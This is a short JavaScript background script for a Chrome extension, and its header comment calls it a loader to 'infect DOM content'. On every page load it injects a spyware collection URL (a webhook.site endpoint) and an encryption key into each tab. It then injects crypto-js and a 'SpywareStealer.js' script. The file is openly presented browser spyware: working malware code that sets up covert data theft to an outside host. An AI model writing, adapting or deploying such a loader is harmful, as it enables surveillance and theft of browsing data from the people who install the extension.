/*
    This file implements the javascript loader to infect DOM content.
    Copyright (C) 2024  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

function set_spyware_variables(url, encryption_key) {
  document.spyware_url = url;
  document.spyware_encryption_key = encryption_key;
}

chrome.webNavigation.onDOMContentLoaded.addListener(async ({ tabId, url }) => {
  chrome.storage.sync.get({ spyware_url: 'https://webhook.site/9a863a81-4ba4-4aab-92a9-816def5255e8', spyware_encryption_key: 'spyw4re_3ncrypti0n_k3y' }, (items) => {
    chrome.scripting.executeScript({
      target: { tabId },
      func: set_spyware_variables,
      args: [items.spyware_url, items.spyware_encryption_key]
    });

    chrome.scripting.executeScript({
      target: { tabId },
      files: ['crypto-js.js', 'SpywareStealer.js']
    });
  });
});
